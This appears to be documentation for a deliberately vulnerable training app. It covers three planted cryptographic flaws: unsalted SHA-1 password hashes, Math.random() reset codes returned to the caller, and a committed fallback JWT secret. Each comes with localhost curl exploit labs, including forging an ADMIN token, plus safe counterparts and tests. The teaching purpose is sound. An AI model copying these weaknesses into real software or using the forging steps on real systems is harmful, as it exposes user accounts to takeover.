# `CRYPTO` — cryptographic failures

Three weaknesses of the legacy account path of `accounts`. The old client's sign-up stores a password as one unsalted SHA-1 digest, its recovery route draws a reset code from `Math.random()` and hands the code back, and its token guard falls back to a signing secret committed in the repository. Each has its protected counterpart in `apps/accounts/src/users/users.resolver.ts`, `apps/accounts/src/admin/admin.controller.ts` and `apps/accounts/src/auth/auth.resolver.ts`.

Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults). Each counterpart's claim is scoped: this operation, receiving the identical input, keeps it inert for the reason given. Nothing here says any operation is secure in general.

<a id="crypto-001"></a>
## CRYPTO-001 — the sign-up of the old client stores an unsalted SHA-1

<a id="crypto-001-agent"></a>
### CRYPTO-001 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `signUp` |
| Sink | The password hashed as SHA-1 with no salt, in `apps/accounts/src/legacy/legacy-auth.resolvers.ts` |
| Flow | the password from the mutation → one `sha1` digest → `$sha1$<digest>` stored for every caller of the same password |
| Counterparts | `apps/accounts/src/users/users.resolver.ts` (`createUser`), `apps/accounts/src/admin/admin.controller.ts` (`POST /internal/admin/users`): both scrypt with a fresh salt per user |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-759, SAST (the line's marker names CWE-916 as well; the catalogue registers CWE-759) |

<a id="crypto-001-student"></a>
### CRYPTO-001 — student guide

A hash without a salt is a lookup table waiting to happen: every caller of the same password stores the same bytes. The legacy sign-up writes `$sha1$` + the digest, and SHA-1 is fast enough to brute-force offline once the store is read.

<a id="crypto-001-exploit"></a>
### CRYPTO-001 — exploit lab

Two accounts, one password, then the stored hashes read through the lab's own query surface (`findUsers`, MONGO-002's operation, with an ordinary signed-in token):

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { signUp(email: \"crypto-one@vcx.exchange\", password: \"shared-lab-only\", displayName: \"Crypto One\") { accessToken } }"}' > /dev/null
$ curl -s $RELAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { signUp(email: \"crypto-two@vcx.exchange\", password: \"shared-lab-only\", displayName: \"Crypto Two\") { accessToken } }"}' > /dev/null
$ TOKEN=$(curl -s $RELAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { signIn(email: \"alice@vcx.exchange\", password: \"alice-lab-only\") { accessToken } }"}' | jq -r .data.signIn.accessToken)
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    --data-raw '{"query":"query ($f: JSON) { findUsers(filter: $f) }","variables":{"f":{"email":{"$in":["crypto-one@vcx.exchange","crypto-two@vcx.exchange"]}}}}'
{"data":{"findUsers":[
  {"_id":"…","email":"crypto-one@vcx.exchange","passwordHash":"$sha1$ece61a70e4b00954546230d6247f9731f5f999b6", …},
  {"_id":"…","email":"crypto-two@vcx.exchange","passwordHash":"$sha1$ece61a70e4b00954546230d6247f9731f5f999b6", …}]}
```

One digest for both accounts. The same password through `createUser` or `POST /internal/admin/users` stores two different `scrypt$16384$8$1$…` strings, because each gets its own salt.

<a id="crypto-001-safe"></a>
### CRYPTO-001 — vulnerable and protected

| | Why |
| --- | --- |
| `signUp` (vulnerable) | One unsalted SHA-1 digest per password: identical inputs, identical stored bytes |
| `createUser` (protected) | scrypt with a random salt per account: the same password stores two different hashes |
| `POST /internal/admin/users` (protected) | The same scrypt path through a DTO and the roles guard |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the same password, given to `createUser` or to `POST /internal/admin/users`, stores a scrypt hash with its own random salt, so two accounts of one password share no stored bytes. The claim is not that a scrypt hash cannot be attacked offline; only that this password leaves no identical digest to find twice.

<a id="crypto-001-tests"></a>
### CRYPTO-001 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `CRYPTO-001`: two sign-ups store one identical `$sha1$` hash; `createUser` and the admin route store two different scrypt hashes for the same password.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries three requests: `CRYPTO-001: the first sign-up with the shared password`, `CRYPTO-001: the second sign-up, the same password` and `CRYPTO-001: both accounts hold one unsalted hash`.

<a id="crypto-002"></a>
## CRYPTO-002 — the recovery code of the old client comes from `Math.random()`

<a id="crypto-002-agent"></a>
### CRYPTO-002 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `recoverPassword` |
| Sink | A reset code drawn from `Math.random()`, returned in the answer, in `apps/accounts/src/legacy/legacy-auth.resolvers.ts` |
| Flow | the email → a six-digit code from `Math.random()` → the code is answered to the caller |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`requestPasswordReset` draws from `crypto.randomInt` and returns no code), `resetPassword` (a new password from `crypto.randomBytes`) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-338, SAST |

<a id="crypto-002-student"></a>
### CRYPTO-002 — student guide

`Math.random()` is not a source of unpredictable values; given a little of its output, its state is recoverable. The legacy recovery mutation both draws the code from it and hands the code back in the response.

<a id="crypto-002-exploit"></a>
### CRYPTO-002 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { recoverPassword(email: \"alice@vcx.exchange\") }"}'
{"data":{"recoverPassword":"114941"}}
```

The code, in the answer. The test proves the predictability directly: with `Math.random` stubbed to return `0.42`, the code is the one the stub predicts. The counterpart answers nothing and draws from `crypto.randomInt`:

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { requestPasswordReset(email: \"alice@vcx.exchange\") }"}'
{"data":{"requestPasswordReset":true}}
```

<a id="crypto-002-safe"></a>
### CRYPTO-002 — vulnerable and protected

| | Why |
| --- | --- |
| `recoverPassword` (vulnerable) | The code is `Math.random()` output and is returned to the caller |
| `requestPasswordReset` (protected) | `crypto.randomInt` for the code, and no code in the answer for either case |
| `resetPassword` (protected) | The new password is `crypto.randomBytes` material, returned once to the administrator |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the request for the same email draws from `crypto.randomInt` at `requestPasswordReset` and answers no code at all, and `resetPassword` draws a new password from `crypto.randomBytes`. The claim is not that either route resists every attack on a reset; only that neither value is drawn from `Math.random()`, and no code is handed to whoever asks for one.

<a id="crypto-002-tests"></a>
### CRYPTO-002 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `CRYPTO-002`: with `Math.random` stubbed to `0.42` the code is the predicted one; `requestPasswordReset` answers the same for both cases and returns no code; `resetPassword` hands out random bytes.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries the request `CRYPTO-002: recoverPassword answers the code itself`.

<a id="crypto-003"></a>
## CRYPTO-003 — the committed fallback secret verifies tokens

<a id="crypto-003-agent"></a>
### CRYPTO-003 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `whoAmI`, through `LegacyTokenGuard` |
| Sink | `process.env.VCX_LEGACY_JWT_SECRET ?? LEGACY_FALLBACK_SECRET`, a string committed in `apps/accounts/src/legacy/legacy-token.guard.ts` |
| Flow | the run does not set the variable → the committed secret signs and verifies → anyone who reads the repository mints tokens |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts`: `me` and `sessionInfo`, reached through the global authentication guard, whose `JwtModule` takes its secret from validated configuration (`libs/internal-auth/src/auth.module.ts`) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-798, SAST |

<a id="crypto-003-student"></a>
### CRYPTO-003 — student guide

A secret in source is a secret everyone who reads the source holds. The legacy guard falls back to a constant committed beside it; the run never sets the environment variable, so the constant is what verifies.

<a id="crypto-003-exploit"></a>
### CRYPTO-003 — exploit lab

```console
$ SECRET=$(node -e "console.log(require('./apps/accounts/dist/legacy/legacy-token.guard.js').LEGACY_FALLBACK_SECRET)")
$ node -e "const jwt=require('jsonwebtoken');console.log(jwt.sign({sub:'u-admin',sid:'fallback-u-admin',role:'ADMIN'},process.env.SECRET,{algorithm:'HS256',expiresIn:'12h'}))" > /tmp/fallback.jwt
$ curl -s $RELAY/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $(cat /tmp/fallback.jwt)" \
    -d '{"query":"{ whoAmI { id email role } }"}'
{"data":{"whoAmI":{"id":"u-admin","email":"admin@vcx.exchange","role":"ADMIN"}}}
```

The same token against `me`: `UNAUTHENTICATED` — the safe guard's secret comes from validated configuration, which this run set and the repository does not carry.

<a id="crypto-003-safe"></a>
### CRYPTO-003 — vulnerable and protected

| | Why |
| --- | --- |
| `whoAmI` (vulnerable) | The verifying secret is a string in the repository when the variable is unset, and the run leaves it unset |
| `me` (protected) | The guard checks the signature against the run's own secret, which the environment supplies and the repository does not carry; a token signed with the committed string does not verify |
| `sessionInfo` (protected) | The `JwtModule` is configured from the same validated configuration |

**Scoped claim.** Each counterpart defeats this flaw for identical input: a token signed with the committed string is refused by `me` and `sessionInfo`, because the guard checks the signature against the run's own secret. The claim is not that the run's secret cannot leak; only that the string in the repository does not sign for these two operations.

<a id="crypto-003-tests"></a>
### CRYPTO-003 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `CRYPTO-003`: a token signed with `LEGACY_FALLBACK_SECRET` reads the administrator through `whoAmI`; `me` and `sessionInfo` refuse the same token.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries the request `CRYPTO-003: whoAmI for a token signed with the committed secret`.
